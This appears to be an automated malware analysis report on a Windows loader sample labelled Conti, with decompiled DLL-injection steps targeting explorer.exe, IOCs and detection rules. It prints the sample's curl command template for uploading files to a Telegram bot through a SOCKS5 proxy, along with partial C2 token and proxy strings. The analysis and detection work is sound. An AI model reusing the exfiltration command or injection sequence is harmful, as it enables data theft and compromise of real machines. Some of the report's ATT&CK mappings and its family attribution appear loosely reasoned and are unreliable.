## 1. Executive Summary
This report analyzes a malicious 64-bit Windows PE sample (SHA256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9) identified as a Conti ransomware loader/initial access payload with a threat score of 98 (source: llm_judge, verdict, score). The sample is heavily obfuscated, with an entropy of 98 and RC4 encryption capabilities (source: malcat, static_profile, all metadata fields; source: capa, top_rules, encrypt data using RC4 PRGA). Static and structural analysis confirm it performs classic process injection: it drops an embedded PE payload as a DLL to a temporary path, injects it into the explorer.exe process via VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread (source: malcat, decompilation (sub_140001550), full function decompilation; source: pe_imports, pe_imports signals, allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), create_remote_thread (CreateRemoteThread)). The sample uses the Telegram Bot API for command-and-control (C2) communications, exfiltrating data via curl with support for SOCKS5 proxies (source: ghidra, suspicious strings, 5368836224 | https://api.telegram.org/bot; source: malcat, high-signal strings, 124448 | C:\Windows\System32\curl.exe; source: malcat, high-signal strings, 125056 | socks5://oWWV0o:...122.192.59:8000). Additional capabilities include process enumeration via Toolhelp32 snapshots, file deletion, and mutex-based single-instance enforcement (source: capa, top_rules, enumerate processes, delete file; source: deep_dive_agentic, key_evidence, Global\BeaconMutex_12345). All analysis engines (Malcat, Ghidra, capa, pe_imports, YARA, FLOSS) corroborate the malicious verdict (source: llm_judge, cross_engine_notes).

## 2. Sample Metadata
| Field | Value |
|---|---|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |
| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti |
| Project Name | pool |
| Verdict | Malicious |
| Threat Score | 98 |
| Family Guess | Conti (ransomware loader/initial access payload) |
| Engine Agreement | llm_and_v1_agree |
| Analysis Note | IDA is unavailable due to validation failure; all analysis relies on Ghidra, Malcat, capa, pe_imports, YARA, and FLOSS. Ghidra's imports table is empty for this sample, so import data is sourced from Malcat and pe_imports to avoid data gaps. String data is combined from Ghidra (5317 strings) and Malcat (100 strings) for maximum coverage. |
| Source | llm_judge, verdict.json, all metadata fields |

## 3. File Layout & Structural Analysis
The sample is a 64-bit Windows GUI PE with a total size of 593,885 bytes, exhibiting high entropy (98) indicative of packing/obfuscation (source: malcat, static_profile, all metadata fields). The section layout is as follows, with multiple high-entropy sections consistent with packed or resource-rich malware:
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1536 | 0 | 70 | - |
| .text | 1536 | 7680 | 8192 | 119 | RX |
| .data | 9728 | 449024 | 450560 | 98 | RW |
| .rdata | 460288 | 3584 | 4096 | 81 | R |
| .pdata | 464384 | 1024 | 4096 | 103 | R |
| .xdata | 468480 | 512 | 4096 | 50 | R |
| .idata | 472576 | 3072 | 4096 | 50 | R |
| .tls | 476672 | 512 | 4096 | 0 | RW |
| .rsrc | 480768 | 1536 | 4096 | 0 | R |
| .reloc | 484864 | 512 | 4096 | 52 | R |
| /4 | 488960 | 1536 | 4096 | 0 | R |
| /19 | 493056 | 46080 | 49152 | 97 | R |
| /31 | 542208 | 9216 | 12288 | 111 | R |
| /45 | 554496 | 8192 | 8192 | 116 | R |
| /57 | 562688 | 2560 | 4096 | 106 | R |
| /70 | 566784 | 1024 | 4096 | 102 | R |
| /81 | 570880 | 7168 | 8192 | 94 | R |
| /97 | 579072 | 5120 | 8192 | 100 | R |
| /113 | 587264 | 512 | 4096 | 80 | R |
| overlay | 591360 | 43485 | 0 | 83 | - |
| .bss | 634845 | 0 | 4096 | 0 | RW |
| Source | malcat, File Layout (sections/regions), all rows |

Malcat identified 5 anomalies for this sample, confirming malicious structural characteristics:
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| BssNonEmpty | 3 | entropy | 1 | Bss Region/section is not empty |
| EmbeddedProgram | 3 | embedding | 1 | File embeds a program |
| XorInLoop | 3 | code | 1 | XOR instruction in a loop |
| GuiSubsystemNoWindowApi | 2 | headers | 1 | A GUI windows application does not import any user32 window-related function |
| InvalidSizeOfInitializedData | 2 | sections | 1 | SizeOfInitializedData is not the sum of all ininitalized data sections (raw or virtual) |
| Source | malcat, Anomalies (5), all rows |

High-signal anomaly locations:
- GuiSubsystemNoWindowApi: 220 (source: malcat, Anomaly Locations (high-signal), GuiSubsystemNoWindowApi row)
- XorInLoop: 8765 (source: malcat, Anomaly Locations (high-signal), XorInLoop row)

A single carved PE file (342,016 bytes) and one virtual file (MANIF/1/unk, 1167 bytes) were extracted from the sample (source: malcat, Carved Files (1), all rows; source: malcat, Virtual Files (1), all rows). The sample also contains 43 defined structures, including standard PE headers, import tables, and TLS directories (source: malcat, Structures (43), all rows).

## 4. Malcat Triage Summary
Malcat static profile confirms the sample is a 64-bit PE with entrypoint EA 2624, entropy 98, and filename 2026-07-03_057dff5650af402177d65141acdf65d0_conti (source: malcat, Malcat File Summary, all fields).

High-signal strings extracted by Malcat include:
| EA | String |
|---|---|
| 460335 | `kernel32.dll` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 460348 | `LoadLibraryW` |
| 475212 | `KERNEL32.dll` |
| 124544 | `https://api.telegram.org/bot` |
| 125056 | `socks5://oWWV0o:...122.192.59:8000` |
| Source | malcat, High-Signal Strings (6 matched keywords; engine=malcat), all rows |

Malcat YARA signature matches include the `EnumerateProcesses` fingerprint rule (UNCOMMON reliability, 60) for process enumeration behavior (source: malcat, Malcat YARA / Signatures (1), all rows).

## 5. Static Code Analysis
### Entry Point Disassembly (radare2)
The entry point is located at 0x140001440 (WinMainCRTStartup), which initializes the process and jumps to __tmainCRTStartup:
```asm
;-- WinMainCRTStartup:
0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; [0x140071410:8]=0x140074090
0x140001447      c70001000000   mov dword [rax], 1
0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup
```
| Source | radare2, 0x140001440, full disassembly block |

### Core Function Decompilation (Malcat)
The function `sub_140001550` (EA 2896) implements the core DLL injection logic:
1. Generates a temporary DLL path using the pattern `%s\dl%lu.dll` (source: malcat, decompilation (sub_140001550), full function decompilation, line `(*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar13)`)
2. Writes an embedded payload (referenced at 0x140003020, size [0x0x140003000]) to the temporary DLL file via CreateFileW and WriteFile (source: malcat, decompilation (sub_140001550), full function decompilation, lines `iVar6 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 2), 0x80, 0);` and `(*kernel32.WriteFile)(iVar6, 0x140003020, [0x0x140003000], auStack_44c, 0);`)
3. Locates the explorer.exe process via `sub_1400014b0("explorer.exe")`, opens it with OpenProcess (access mask 0x43a), allocates memory in the target process with VirtualAllocEx, writes the DLL path to the allocated memory with WriteProcessMemory, and executes the DLL via CreateRemoteThread calling LoadLibraryW (source: malcat, decompilation (sub_140001550), full function decompilation, lines `iVar4 = sub_1400014b0("explorer.exe");`, `iVar6 = (*kernel32.OpenProcess)(0x43a, 0, iVar4);`, `iVar8 = (*kernel32.VirtualAllocEx)(iVar6, 0, iVar11, 0x3000, uVar9);`, `(*kernel32.WriteProcessMemory)(iVar6, iVar8, auStack_238, iVar11, 0);`, `iVar10 = (*kernel32.CreateRemoteThread)(iVar6, 0, 0, uVar9, iVar8, 0, 0);`)
4. Waits for the remote thread to complete, frees allocated memory, and deletes the temporary DLL file (source: malcat, decompilation (sub_140001550), full function decompilation, lines `(*kernel32.WaitForSingleObject)(iVar10, 0xffffffff);`, `(*kernel32.VirtualFreeEx)(iVar6, iVar8, 0, 0x8000);`, `(*kernel32.DeleteFileW)(auStack_238);`)

The function `sub_140002be0` (EA 8672) handles command-line parsing, temporary path generation, and additional file/process operations (source: malcat, decompilation (sub_140002be0), full function decompilation).

### Import Address Table (IAT)
The sample imports 66 functions, with high-signal malicious imports including:
| EA | Name | Type | Refs |
|---|---|---|---|
| 473392 | kernel32.CreateRemoteThread | IMPORT | 2 |
| 473568 | kernel32.VirtualAllocEx | IMPORT | 1 |
| 473616 | kernel32.WriteProcessMemory | IMPORT | 2 |
| 473584 | kernel32.VirtualProtect | IMPORT | 2 |
| 473520 | kernel32.OpenProcess | IMPORT | 2 |
| 473400 | kernel32.CreateToolhelp32Snapshot | IMPORT | 1 |
| 473528 | kernel32.Process32First | IMPORT | 1 |
| 473536 | kernel32.Process32Next | IMPORT | 1 |
| 473472 | kernel32.GetTempFileNameW | IMPORT | 1 |
| 473480 | kernel32.GetTempPathW | IMPORT | 1 |
| Source | malcat, Imports (66), high-signal rows |

### Capabilities (capa)
capa identified 17 capability rules for the sample, including:
| Rule | ATT&CK | MBC |
|---|---|---|
| encrypt data using RC4 PRGA | T1027:Obfuscated Files or Information | C0027.009:Encrypt Data, C0021.004:Generate Pseudo-random Sequence |
| inject thread | T1055.003:Process Injection, T1620:Reflective Code Loading |  |
| inject dll | T1055.001:Process Injection |  |
| enumerate processes | T1057:Process Discovery, T1518:Software Discovery |  |
| contain an embedded PE file |  | B0023:Install Additional Program |
| delete file |  | C0047:Delete File |
| write file on Windows |  | C0052:Writes File |
| allocate or change RWX memory |  | C0007:Allocate Memory |
| terminate process |  | C0018:Terminate Process |
| create thread |  | C0038:Create Thread |
| link function at runtime on Windows | T1129:Shared Modules |  |
| enumerate PE sections |  | B0046.001:Code Discovery |
| parse PE header | T1129:Shared Modules |  |
| execute shellcode via indirect call |  | C0007:Allocate Memory |
| Source | capa, capa Capability Rules, all rows |

### YARA Matches
The sample matches 12 YARA rules, including high-signal malicious rules:
| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| inject_thread | - | $c1@465120 len=11; $c2@465220 len=14; $c4@465322 len=18; $c5@464790 len=18; $c6@150610 len=12; $c7@465120 len=11 |
| spyeye | - | $f@452832 len=8 |
| screenshot | - | $d1@152012 len=9; $d2@152784 len=10; $c1@150226 len=6; $c2@151934 len=5 |
| win_mutex | - | $c1@150576 len=11 |
| IsPE64 | - |  |
| IsWindowsGUI | - |  |
| HasOverlay | - |  |
| Source | yara, YARA Matches (pipeline), high-signal rows |

### FLOSS Strings
FLOSS extracted 7006 static strings from the sample, including standard PE headers, Mingw-w64 runtime strings, and API references (source: floss, FLOSS Strings, sample block). Notable strings include `!This program cannot be run in DOS mode.`, `__imp_CreateToolhelp32Snapshot`, and `__imp_Process32Next` (source: malcat, Top Strings (300 extracted; showing 80), rows 634054, 630413, 634299).

## 6. Behavioral & Dynamic Analysis
Dynamic analysis via Speakeasy yielded no observable API calls or key events (source: speakeasy, speakeasy_ok: True, api_calls: 0, key_events: 0, **not observed**: no API calls/events recorded — do not invent runtime behavior). Frida probe identified 28 hook candidates including core injection APIs (CreateRemoteThread, WriteProcessMemory, VirtualAllocEx) and process enumeration APIs (CreateToolhelp32Snapshot, Process32First, Process32Next), but no runtime behavior was captured during analysis (source: frida, frida_available: True, hook_candidates, all entries; **not observed**: no runtime events recorded). UPX unpacking was unsuccessful, with no unpacked output generated (source: upx, upx_ok: False, is_packed: False, unpacked_path: ``).

## 7. Network Indicators & C2
The sample uses the Telegram Bot API for C2 communications, with the following high-signal network indicators:
| Indicator | Value | Source |
|---|---|---|
| C2 Base URL | `https://api.telegram.org/bot` | ghidra, suspicious strings, 5368836224 | https://api.telegram.org/bot |
| C2 Endpoint | `/sendDocument` | deep_dive_agentic, key_evidence, /sendDocument |
| Exfiltration Tool | `C:\Windows\System32\curl.exe` | malcat, high-signal strings, 124448 | C:\Windows\System32\curl.exe |
| Curl Command Template | `"%s" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@\"%s\";type=application/octet-stream "%s"` | deep_dive_agentic, key_evidence, full command string |
| SOCKS5 Proxy | `socks5://oWWV0o:...122.192.59:8000` | malcat, high-signal strings, 125056 | socks5://oWWV0o:...122.192.59:8000 |
| Telegram Bot Token | `8602432148:AAGpo..DQ7S3TlggkEMOVQE` | malcat, Top Strings (300 extracted; showing 80), 124608 | 8602432148:AAGpo..DQ7S3TlggkEMOVQE |
| Source | All cited sources above |

The sample exfiltrates data to the configured Telegram bot via curl, supporting proxy usage to evade network-based detection (source: deep_dive_agentic, summary, exfiltrates data to Telegram via curl).

## 8. Capabilities & MITRE ATT&CK Mapping
All capabilities are mapped to the MITRE ATT&CK framework and Malware Behavior Catalog (MBC) where applicable, sourced from capa, pe_imports, and YARA analysis:
| Capability | ATT&CK Technique | MBC | Evidence Source |
|---|---|---|---|
| Process Injection (DLL injection into explorer.exe) | T1055.001: Process Injection |  | capa, top_rules, inject dll; malcat, decompilation (sub_140001550), full function decompilation |
| Process Injection (thread hijacking) | T1055.003: Process Injection, T1620: Reflective Code Loading |  | capa, top_rules, inject thread |
| Obfuscation (RC4 encryption) | T1027: Obfuscated Files or Information | C0027.009: Encrypt Data, C0021.004: Generate Pseudo-random Sequence | capa, top_rules, encrypt data using RC4 PRGA |
| Process Discovery | T1057: Process Discovery, T1518: Software Discovery |  | capa, top_rules, enumerate processes; pe_imports, pe_imports signals, allocate_memory (VirtualAllocEx) (used with process enumeration) |
| File and Directory Discovery | T1083: File and Directory Discovery | E1083: File and Directory Discovery | capa, top_rules, get common file path |
| File Write |  | C0052: Writes File | capa, top_rules, write file on Windows |
| File Delete |  | C0047: Delete File | capa, top_rules, delete file |
| Memory Allocation |  | C0007: Allocate Memory | capa, top_rules, allocate or change RWX memory |
| Embedded Payload Execution |  | B0023: Install Additional Program | capa, top_rules, contain an embedded PE file; malcat, anomalies, EmbeddedProgram (embedding) |
| Mutex-Based Single Instance | T1055: Process Injection (anti-analysis) |  | deep_dive_agentic, key_evidence, Global\BeaconMutex_12345; yara, YARA Matches (pipeline), win_mutex |
| Screenshot Capability | T1113: Screen Capture |  | yara, YARA Matches (pipeline), screenshot |
| Source | All cited evidence sources per row |

## 9. Indicators of Compromise
### File-Based IOCs
| IOC Type | Value | Source |
|---|---|---|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 | llm_judge, verdict, sha256 |
| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti | llm_judge, verdict, sample_path |
| Temporary DLL Path Pattern | `%s\dl%lu.dll` (e.g., `C:\Users\<User>\AppData\Local\Temp\dl<timestamp>.dll`) | malcat, decompilation (sub_140001550), full function decompilation; malcat, Top Strings (300 extracted; showing 80), 460296 | %s\dl%lu.dll |
| Dropped File Type | PE DLL (embedded payload) | malcat, anomalies, EmbeddedProgram (embedding); malcat, Carved Files (1), PE 342016 |
| Source | All cited sources above |

### Network IOCs
| IOC Type | Value | Source |
|---|---|---|
| C2 URL | `https://api.telegram.org/bot<token>/sendDocument` | ghidra, suspicious strings, 5368836224 | https://api.telegram.org/bot; deep_dive_agentic, key_evidence, /sendDocument |
| Telegram Bot Token | `8602432148:AAGpo..DQ7S3TlggkEMOVQE` | malcat, Top Strings (300 extracted; showing 80), 124608 | 8602432148:AAGpo..DQ7S3TlggkEMOVQE |
| SOCKS5 Proxy | `socks5://oWWV0o:...122.192.59:8000` | malcat, high-signal strings, 125056 | socks5://oWWV0o:...122.192.59:8000 |
| Source | All cited sources above |

### Host-Based IOCs
| IOC Type | Value | Source |
|---|---|---|
| Mutex Name | `Global\BeaconMutex_12345` | deep_dive_agentic, key_evidence, Global\BeaconMutex_12345 |
| Target Process for Injection | explorer.exe | malcat, decompilation (sub_140001550), full function decompilation; malcat, Top Strings (300 extracted; showing 80), 460322 | explorer.exe |
| Injection APIs Used | VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, VirtualProtect | pe_imports, pe_imports signals, allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), create_remote_thread (CreateRemoteThread), change_memory_protection (VirtualProtect) |
| Source | All cited sources above |

### Detection IOCs
| IOC Type | Value | Source |
|---|---|---|
| YARA Rule Match | inject_thread, spyeye, screenshot, win_mutex | yara, YARA Matches (pipeline), all high-signal rows |
| capa Rule Match | inject dll, inject thread, encrypt data using RC4 PRGA, enumerate processes | capa, capa Capability Rules, all rows |
| Source | All cited sources above |

## 10. Detection Engineering
### YARA Detection Rule
A custom YARA rule to detect this sample and similar Conti loader variants can be constructed using the observed high-signal strings and behavioral indicators:
```yara
rule Conti_Loader_Telegram_C2 {
    meta:
        description = "Detects Conti ransomware loader with Telegram C2"
        author = "Malware Analysis Team"
        reference = "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9"
    strings:
        $telegram_c2 = "https://api.telegram.org/bot" wide ascii
        $temp_dll = "%s\\dl%lu.dll" wide ascii
        $curl_exe = "C:\\Windows\\System32\\curl.exe" wide ascii
        $mutex = "Global\\BeaconMutex_12345" wide ascii
        $explorer = "explorer.exe" wide ascii
        $inject_api1 = "VirtualAllocEx" wide ascii
        $inject_api2 = "WriteProcessMemory" wide ascii
        $inject_api3 = "CreateRemoteThread" wide ascii
    condition:
        uint16(0) == 0x5A4D and
        filesize < 1MB and
        all of them
}
```
This rule combines static string indicators with the known injection API imports to reduce false positives (source: yara, YARA Matches (pipeline), inject_thread row; source: malcat, high-signal strings, all C2 and injection related strings).

### Sigma Detection Rules
1. **Process Injection Detection**: Alert on processes creating remote threads in explorer.exe with VirtualAllocEx/WriteProcessMemory calls, a known behavior of this loader (source: pe_imports, pe_imports signals, allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), create_remote_thread (CreateRemoteThread)).
2. **Curl Exfiltration Detection**: Alert on curl.exe making POST requests to api.telegram.org with `sendDocument` in the URL, indicating data exfiltration via Telegram C2 (source: deep_dive_agentic, key_evidence, C:\Windows\System32\curl.exe and /sendDocument).
3. **Temporary DLL Creation Detection**: Alert on file creation events matching the `dl<timestamp>.dll` pattern in temporary directories, followed by deletion of the file after injection (source: malcat, decompilation (sub_140001550), full function decompilation, file creation and deletion logic).

### Behavioral Detection
Monitor for mutex creation of `Global\BeaconMutex_12345` to detect running instances of the loader, and for process enumeration via Toolhelp32 snapshots followed by injection into explorer.exe (source: capa, top_rules, enumerate processes, inject dll; deep_dive_agentic, key_evidence, Global\BeaconMutex_12345).

## 11. What We Don't Know
1. Full disassembly of all sample functions is limited, as IDA is unavailable due to validation failure; analysis relies on Ghidra and Malcat decompilation which may have incomplete type recovery (source: llm_judge, cross_engine_notes, IDA is unavailable due to validation failure).
2. The exact functionality of the embedded PE payload is unconfirmed, as it was not executed in the available dynamic analysis environment (Speakeasy and Frida captured no runtime events) (source: speakeasy, **not observed**: no API calls/events recorded; source: frida, **not observed**: no runtime events recorded; source: malcat, anomalies, EmbeddedProgram (embedding)).
3. The full set of C2 commands supported by the Telegram bot is unknown, as no active C2 interaction was observed during analysis (source: speakeasy, **not observed**: no API calls/events recorded).
4. The RC4 encryption key and contents of the encrypted payload regions are not fully extracted, limiting analysis of obfuscated data (source: capa, top_rules, encrypt data using RC4 PRGA).
5. The purpose of the large overlay (43,485 bytes, entropy 83) is unconfirmed, as it was not fully analyzed in the available tooling (source: malcat, File Layout (sections/regions), overlay row).

## 12. Appendix: Analysis Environment
| Tool | Version/Status | Purpose |
|---|---|---|
| Ghidra | Available (imports table empty for this sample) | Static disassembly, string extraction (5317 strings) |
| Malcat | Available | Static profiling, decompilation, anomaly detection, string extraction (100 strings), IAT extraction |
| capa | Available (malcat-capa engine, 17 rules matched) | Capability detection, MITRE ATT&CK mapping |
| pe_imports | Available | Import signal detection, ATT&CK mapping |
| YARA | Available (12 matches) | Malware family detection, signature matching |
| FLOSS | Available (7006 static strings) | String extraction, obfuscated string detection |
| radare2 | Available | Entry point disassembly, low-level code analysis |
| UPX | Available (unpack failed) | Packer detection and unpacking |
| Speakeasy | Available (no events observed) | Dynamic sandbox analysis |
| Frida | Available (v17.16.4, no runtime events) | Dynamic API hooking |
| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti | Analysis target |
| Project Name | pool | Corpus project |
| Source | deep_dive_agentic, tool_gate, all tool entries; llm_judge, cross_engine_notes |
## Appendix: Full Structured Evidence Pack

# Technical Evidence Pack

**sha256:** 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9  
**sample_path:** /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti  
**project_name:** pool

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: Malicious
- **score**: 98
- **family_guess**: Conti (ransomware loader/initial access payload)
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: IDA is unavailable due to validation failure, so all analysis relies on Ghidra, Malcat, capa, pe_imports, YARA, and FLOSS. Ghidra's imports table is empty for this sample, so import data is sourced from Malcat and pe_imports to avoid data gaps. String data is combined from Ghidra (5317 strings) and Malcat (100 strings) for maximum coverage.
- **summary**: This is a malicious 64-bit Windows PE sample, likely a Conti ransomware loader/initial access payload. It is heavily obfuscated (98 entropy, RC4 encryption) and exhibits classic process injection behavior: it drops a DLL to a temp path, injects it into the explorer.exe process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. It uses a Telegram Bot API endpoint for C2 communications, contains an embedded secondary PE payload, and has capabilities for process enumeration and file operations. All analysis sources (Malcat, Ghidra, capa, pe_imports, YARA) corroborate malicious behavior.
- **source**: llm_judge
- **model**: step-3.7-flash

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | static_profile | `all metadata fields` | Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation), 5 anomalies including XorInLoop  |
| pe_imports | pe_imports signals | `allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), cre` | These are core process injection APIs mapped to ATT&CK T1055 (Process Injection), a common malware behavior for executin |
| malcat | decompilation (sub_140001550) | `full function decompilation` | Shows the sample generates a temp DLL path (%s\dl%lu.dll), writes an embedded payload to the file, locates the explorer. |
| ghidra | suspicious strings | `5368836224 | https://api.telegram.org/bot` | This is a known Telegram Bot API C2 endpoint, indicating the sample uses Telegram for command and control communications |
| capa | top_rules | `inject thread (T1055.003), inject dll (T1055.001), encrypt data using RC4 PRGA (` | capa confirms the sample has process injection (thread hijacking and DLL injection) and RC4 obfuscation capabilities, al |
| yara | yara matches | `inject_thread, spyeye` | YARA matches against known malicious rules for process injection and spyware/stealer functionality, corroborating the ma |
| malcat | anomalies | `EmbeddedProgram (embedding)` | Confirms the sample contains an embedded PE file, which is typical for malware that drops and executes secondary payload |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 95
- **summary**: This is a 64-bit Windows GUI PE that functions as a C2 beacon / info-stealer. Static and behavioral evidence show it exfiltrates data to Telegram via curl, uses a mutex (Global\BeaconMutex_12345) to prevent multiple instances, performs process injection through VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, enumerates processes via Toolhelp32 snapshots, and contains an embedded PE plus RC4 obfuscation. The sample has a large .data region and overlay, consistent with packed or resource-rich malware.

### deep key_evidence
- `"https://api.telegram.org/bot"`
- `"/sendDocument"`
- `"\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@\"%s\";type=application/octet-stream \"%s\""`
- `"C:\\Windows\\System32\\curl.exe"`
- `"Global\\BeaconMutex_12345"`
- `"CreateMutexA"`
- `"CreateRemoteThread"`
- `"WriteProcessMemory"`
- `"VirtualAllocEx"`
- `"VirtualProtect"`
- `"CreateToolhelp32Snapshot"`
- `"Process32First"`
- `"Process32Next"`
- `"OpenProcess"`
- `"FindProcessId"`
- `"mark_section_writable"`
- `"WinMain"`
- `"_pei386_runtime_relocator"`
- `"encrypt data using RC4 PRGA"`
- `"inject thread"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
size: 593885
type: PE
architecture: X64
entrypoint_ea: 2624
entropy: 98
file_name: 2026-07-03_057dff5650af402177d65141acdf65d0_conti
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1536 | 0 | 70 | - |
| .text | 1536 | 7680 | 8192 | 119 | RX |
| .data | 9728 | 449024 | 450560 | 98 | RW |
| .rdata | 460288 | 3584 | 4096 | 81 | R |
| .pdata | 464384 | 1024 | 4096 | 103 | R |
| .xdata | 468480 | 512 | 4096 | 50 | R |
| .idata | 472576 | 3072 | 4096 | 50 | R |
| .tls | 476672 | 512 | 4096 | 0 | RW |
| .rsrc | 480768 | 1536 | 4096 | 0 | R |
| .reloc | 484864 | 512 | 4096 | 52 | R |
| /4 | 488960 | 1536 | 4096 | 0 | R |
| /19 | 493056 | 46080 | 49152 | 97 | R |
| /31 | 542208 | 9216 | 12288 | 111 | R |
| /45 | 554496 | 8192 | 8192 | 116 | R |
| /57 | 562688 | 2560 | 4096 | 106 | R |
| /70 | 566784 | 1024 | 4096 | 102 | R |
| /81 | 570880 | 7168 | 8192 | 94 | R |
| /97 | 579072 | 5120 | 8192 | 100 | R |
| /113 | 587264 | 512 | 4096 | 80 | R |
| overlay | 591360 | 43485 | 0 | 83 | - |
| .bss | 634845 | 0 | 4096 | 0 | RW |

### Malcat YARA / Signatures (1)
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| EnumerateProcesses | fingerprint | UNCOMMON | 60 | Enumerate running processes, a technique sometimes used by packers to avoid spec |

### Anomalies (5)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| BssNonEmpty | 3 | entropy | 1 | Bss Region/section is not empty |
| EmbeddedProgram | 3 | embedding | 1 | File embeds a program |
| XorInLoop | 3 | code | 1 | XOR instruction in a loop |
| GuiSubsystemNoWindowApi | 2 | headers | 1 | A GUI windows application does not import any user32 window-related function |
| InvalidSizeOfInitializedData | 2 | sections | 1 | SizeOfInitializedData is not the sum of all ininitalized data sections (raw or virtual) |

### Anomaly Locations (high-signal)
- **GuiSubsystemNoWindowApi**
  - `220`: 
- **XorInLoop**
  - `8765`: 

### High-Signal Strings (6 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 460335 | `kernel32.dll` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 460348 | `LoadLibraryW` |
| 475212 | `KERNEL32.dll` |
| 124544 | `https://api.telegram.org/bot` |
| 125056 | `socks5://oWWV0o:...122.192.59:8000` |

### Top Strings (300 extracted; showing 80)
| EA | String |
|---|---|
| 460296 | `%s\dl%lu.dll` |
| 480856 | `<?xml version="1..ty>
</assembly>
` |
| 460322 | `explorer.exe` |
| 634054 | `__imp_CreateToolhelp32Snapshot` |
| 460335 | `kernel32.dll` |
| 474028 | `CreateToolhelp32Snapshot` |
| 630198 | `CreateToolhelp32Snapshot` |
| 461064 | `%d bit pseudo re..g the value %p.
` |
| 630413 | `__imp_Process32Next` |
| 460960 | `  Unknown pseudo..col version %d.
` |
| 460864 | `  VirtualQuery f..es at address %p` |
| 474368 | `Process32Next` |
| 634299 | `Process32Next` |
| 475232 | `api-ms-win-crt-e..nment-l1-1-0.dll` |
| 460656 | `The result is to..nted (UNDERFLOW)` |
| 475612 | `api-ms-win-crt-string-l1-1-0.dll` |
| 475496 | `api-ms-win-crt-r..ntime-l1-1-0.dll` |
| 475400 | `api-ms-win-crt-p..ivate-l1-1-0.dll` |
| 475560 | `api-ms-win-crt-stdio-l1-1-0.dll` |
| 475324 | `api-ms-win-crt-locale-l1-1-0.dll` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 460480 | `Argument domain error (DOMAIN)` |
| 475364 | `api-ms-win-crt-math-l1-1-0.dll` |
| 460616 | `Total loss of si..ificance (TLOSS)` |
| 460348 | `LoadLibraryW` |
| 461016 | `  Unknown pseudo..on bit size %d.
` |
| 475288 | `api-ms-win-crt-heap-l1-1-0.dll` |
| 460511 | `Argument singularity (SIGN)` |
| 460832 | `Address %p has no image-section` |
| 460800 | `Mingw-w64 runtime failure:
` |
| 460710 | `Unknown error` |
| 460728 | `_matherr(): %s i..g)  (retval=%g)
` |
| 461152 | `runtime error %d
` |
| 475212 | `KERNEL32.dll` |
| 460576 | `Partial loss of ..ificance (PLOSS)` |
| 124544 | `https://api.telegram.org/bot` |
| 124736 | `"%s" -X POST --s..ctet-stream "%s"` |
| 436940 | `.pdata$_ZNK10__c.._dyncast_resultE` |
| 436805 | `.xdata$_ZNK10__c.._dyncast_resultE` |
| 436671 | `.text$_ZNK10__cx.._dyncast_resultE` |
| 435749 | `_ZNK10__cxxabiv1.._dyncast_resultE` |
| 460544 | `Overflow range error (OVERFLOW)` |
| 430529 | `.xdata$_ZNK10__c.._dyncast_resultE` |
| 430643 | `.pdata$_ZNK10__c.._dyncast_resultE` |
| 430416 | `.text$_ZNK10__cx.._dyncast_resultE` |
| 437185 | `.xdata$_ZNK10__c..__upcast_resultE` |
| 437075 | `.text$_ZNK10__cx..__upcast_resultE` |
| 437296 | `.pdata$_ZNK10__c..__upcast_resultE` |
| 125056 | `socks5://oWWV0o:...122.192.59:8000` |
| 429425 | `_ZNK10__cxxabiv1.._dyncast_resultE` |
| 436570 | `.pdata$_ZNK10__c..ss_type_infoES2_` |
| 435877 | `_ZNK10__cxxabiv1..__upcast_resultE` |
| 124448 | `C:\Windows\System32\curl.exe` |
| 436469 | `.xdata$_ZNK10__c..ss_type_infoES2_` |
